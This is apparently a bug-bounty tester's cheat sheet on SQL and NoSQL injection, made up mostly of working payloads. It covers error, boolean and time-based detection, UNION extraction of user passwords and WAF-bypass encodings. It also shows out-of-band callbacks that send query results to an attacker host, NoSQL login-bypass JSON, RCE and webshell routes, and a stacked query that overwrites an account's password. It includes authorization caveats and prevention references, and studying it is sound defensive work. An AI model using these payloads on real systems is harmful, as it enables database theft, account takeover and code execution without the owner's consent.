# SQL Injection (SQLi)

**TL;DR**: input reaches a non-parameterized SQL query. Confirm with an oracle (error / boolean / time / OOB), fingerprint the DBMS, then extract. **Non-destructive**: never `DROP`/`UPDATE`/`DELETE` in BB. Automate cleanly with sqlmap on an exported request.

## Where to look
- Any parameter reflected into a query: `id`, `search`, `filter`, `sort`, `order`, `category`, `page`, `limit`, `username`.
- Less obvious spots: `ORDER BY` (column name), `LIMIT`, `IN (...)`, sort columns, headers (`User-Agent`, `Referer`, `X-Forwarded-For`) logged to DB, cookies, JSON body, XML `Content-Type`.
- **Second-order**: a stored value (username at signup) later reused in a query.

## Detection (oracles)
- **Error**: `'` `"` `\` `)` `';` - breaks the page? SQL message (`SQL syntax`, `ORA-`, `PG::`, `SQLSTATE`)?
- **Boolean**: `' AND '1'='1` (true) vs `' AND '1'='2` (false) → response difference. Numeric: `id=1 AND 1=1` vs `id=1 AND 1=2`. Also `' OR SLEEP(0)-- ` neutral.
- **Time-based (blind)**: DB sleeps if true → measure time.
- **OOB**: DNS/HTTP callback if output is closed (see below).
- **Math**: `id=2-1` returns the same as `id=1` → numeric injection.

## Fingerprint the DBMS
| Test | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| Concat | `'a''b'` / `CONCAT()` | `'a'||'b'` | `'a'+'b'` | `'a'||'b'` | `'a'||'b'` |
| Version | `@@version` / `version()` | `version()` | `@@version` | `banner FROM v$version` | `sqlite_version()` |
| Comment | `-- `, `#`, `/**/` | `-- `, `/**/` | `-- `, `/**/` | `-- ` | `-- ` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message(('a'),5)` | heavy `randomblob` |

## UNION-based (direct extraction)
1. Column count: `ORDER BY 1`, `2`, ... until error; or `UNION SELECT NULL,NULL,...` until success.
2. Displayed columns: `UNION SELECT 1,2,3` → spot which number comes out.
3. Extract: `UNION SELECT username,password,3 FROM users`.
4. Types: put `NULL` where the type clashes; cast (`CAST(x AS CHAR)`).
- MySQL data: `information_schema.tables` / `.columns`. Oracle: needs `FROM dual`.

## Blind - Boolean & Time
- Boolean substring: `AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'`.
- Conditional time: `AND IF(1=1,SLEEP(5),0)` (MySQL) / `; IF(...) WAITFOR DELAY` (MSSQL) / `AND (SELECT CASE WHEN (cond) THEN pg_sleep(5) ELSE pg_sleep(0) END)` (PG).
- Automate the character binary search (sqlmap does it; or Caido Automate + time column).

## OOB (Out-Of-Band, no visible output)
- MSSQL: `master..xp_dirtree '\\attacker.oast.fun\a'`.
- Oracle: `UTL_HTTP.request`, `SYS.DBMS_LDAP.INIT`, XXE via `extractvalue`.
- MySQL (Windows, permissive `secure_file_priv`): `LOAD_FILE(CONCAT('\\\\',(subquery),'.oast.fun\\a'))`.
- PostgreSQL: `COPY ... TO PROGRAM` (if superuser), `dblink`.

## Filter / WAF bypass (see also 00_WAF_ENCODING.md)
- Whitespace: `/**/`, `%09`, `%0a`, `+`, `()`, `/*!*/`.
- Keywords: `SeLeCt`, `UNI/**/ON`, `%53ELECT`, double encoding.
- Quote-less: `0x61646d696e` (hex), `CHAR(97,...)`, `id=0x...`, char concat.
- Avoid `=`: `LIKE`, `IN`, `BETWEEN`, `<`/`>`, `REGEXP`.
- `OR`/`AND` blocked: `||`, `&&`, `%26%26`.
- MySQL versioned comment: `/*!50000UNION*/`.
- HPP: `?id=1&id=2` to split.

## NoSQL (Mongo & co.) - quick notes
- Detection: send `'` (often no error), test `[$ne]` / typed JSON. Switch GET->POST and add `Content-Type: application/json` before sending JSON operators.
- Auth bypass: `{"user":"admin","pass":{"$ne":""}}`, `{"user":{"$ne":"x"},"pass":{"$ne":"x"}}`, `{"user":{"$in":["admin","administrator","superadmin"]},"pass":{"$ne":""}}`; form: `user[$ne]=x`.
- Operator injection: `$where`, `$regex`, `$gt`, `$exists`. JS injection in `$where`.
- Blind boolean: `' && 0 && 'x` (false) vs `' && 1 && 'x` (true); `'||1||'`. JS: `admin' && this.password[0]=='a' || 'a'=='b`, `admin' && this.password.match(/\d/) || 'a'=='b`.
- Parser-break fuzz probe (URL-encoded): `%27%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`.

## Advanced exploitation (mention, do not run in BB unless authorized)
- File read: MySQL `LOAD_FILE`, PG `pg_read_file`, MSSQL `OPENROWSET`.
- RCE: MSSQL `xp_cmdshell`, PG `COPY TO PROGRAM` / extension, MySQL UDF. **Explicit authorization required.**
- Webshell write: `INTO OUTFILE` (MySQL) - destructive/out-of-scope by default.
- Stacked queries (MSSQL/PG, rarely MySQL): auth abuse without dumping, e.g. `; UPDATE users SET password='<known-bcrypt>' WHERE email='you@x'` or `; INSERT INTO adminusers(...) VALUES(...)`. Destructive: authorization only.
- sqlmap automation: `sqlmap -r req.txt --batch --dbms=... --tamper=base64encode --proxy=http://127.0.0.1:8080`; `--base64=<param>` when the param is base64-wrapped; `--flush-session` to reset.

## Impact / proof
- Minimal PoC: extract `version()`/`current_user`/`database()` = enough to prove. Avoid dumping real data.

## Caido
- Establish baseline (status/len/time) in Replay. Add `'`, `"`, `)` and compare vs baseline.
- Time-based → Automate sorts by the "time" column. Boolean → two payloads (TRUE/FALSE), compare length.
- Dump the Replay request and hand it to **sqlmap** (`-r req.txt --batch --level=3 --risk=2 --dbms=...`, low `--threads`, stay in scope).

## References
- PortSwigger - SQL injection - https://portswigger.net/web-security/sql-injection
- PortSwigger - SQLi cheat sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet
- PayloadsAllTheThings - SQL Injection - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- OWASP - SQLi Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP WSTG - Testing for SQL Injection - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- PayloadsAllTheThings - NoSQL Injection - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- sqlmap - https://github.com/sqlmapproject/sqlmap
